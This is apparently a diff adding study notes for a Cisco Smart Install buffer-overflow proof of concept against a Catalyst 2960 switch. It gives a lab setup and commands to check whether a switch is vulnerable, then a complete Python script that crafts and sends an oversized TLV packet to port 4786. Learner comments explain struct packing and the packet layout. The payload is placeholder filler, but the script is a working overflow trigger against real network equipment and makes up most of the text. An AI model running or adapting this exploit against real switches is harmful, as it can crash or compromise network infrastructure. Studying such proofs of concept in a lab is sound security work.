@@ -1,0 +1,86 @@
+======
+SETUP
+======
+Host A         <-----------------> C2960 SI PoE 24 Switch (c2960-lanlitek9-mz.122-58.SE2.bin)
+192.168.200.2                      192.168.200.1
+
+==============================
+CHECK IF SWITCH IS VULNERABLE
+==============================
+SW>show vstack config
+SW>show tcp brief all
+
+====================
+EXPLOIT.PY BREAKDOWN
+====================
+#smi_ibc_init_discovery_BoF.py
+
+import socket 
+import struct 
+from optparse import OptionParser 
+
+# parse the target options 
+parser = OptionParser() 
+parser.add_option("-t", "--target", dest="target", help="Smart Install Client", default="192.168.1.1")
+parser.add_option("-p", "--port", dest="port", type="int", help="Port of Client", default=4786)
+(options, args) = parser.parse_args() 
+
+def craft_tlv(t, v, t_fmt='!I', l_fmt='!I'): 
+    return struct.pack(t_fmt, t) + struct.pack(l_fmt, len(v)) + v
+
+#what is struct.park(function)?
+#it packs a list of values into a String representation of the specified type    
+    
+#what is tlv?
+#for data formitting. when we want to send data to receiver, we prepare a TLV package that contains Tag-Length-Value datas
+#1. data type/tag
+#2. data length
+#3. data value
+
+#!'I' --> format string for network
+#fmt ---> format string
+
+def send_packet(sock, packet): 
+    sock.send(packet)   
+
+def receive(sock):  
+    return sock.recv() 
+
+if __name__ == "__main__": 
+
+    print "[*] Connecting to Smart Install Client ", options.target, "port", options.port 
+
+    #establish a connection
+    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+    con.connect((options.target, options.port)) 
+
+    payload = 'BBBB' * 44    
+    shellcode = 'D' * 2048
+    
+    data = 'A' * 36 + struct.pack('!I', len(payload) + len(shellcode) + 40) + payload
+    #print "start of data: ", len(struct.pack('!I', len(payload) + len(shellcode) + 40)), "end of data "
+    
+    tlv_1 = craft_tlv(0x00000001, data)
+    #print "start of tlv_1: ", len(tlv_1), "end of tlv_1 "
+    
+    tlv_2 = shellcode
+    
+
+#crafting the header
+#hdr ----> header which consists of |msg-from|version|msg_hdr-type|data_length|
+    hdr =  '\x00\x00\x00\x01'                                   # msg_from
+    hdr += '\x00\x00\x00\x01'                                   # version
+    hdr += '\x00\x00\x00\x07'                                   # msg_hdr_type
+    hdr += struct.pack('>I', len(data))                         # data_length
+    #>I --> format string for big-endian
+    #4+4+4+4=16bytes
+    #print "start of hdr: ", str(hdr), "End of hdr "
+    
+
+#the packet consists of | header (16 bytes)| TLV_1 (224 bytes)|TLV (2048 bytes) |
+    pkt = hdr + tlv_1 + tlv_2 
+    #print str(pkt)
+    
+    print "[*] Send a malicious packet"
+    
+    send_packet(con, pkt)
